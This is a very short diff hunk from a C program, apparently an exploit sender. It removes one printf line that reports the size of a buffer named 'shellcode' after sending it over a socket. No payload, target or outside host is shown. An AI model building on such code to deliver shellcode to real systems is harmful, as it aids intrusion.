@@ -104,7 +104,6 @@ int main() {
     return -1;
   }
   send(sock, shellcode, strlen(shellcode), 0);
-  printf("Buffer sent: %d bytes \n", strlen(shellcode));
   close(sock);
 
   return 0;
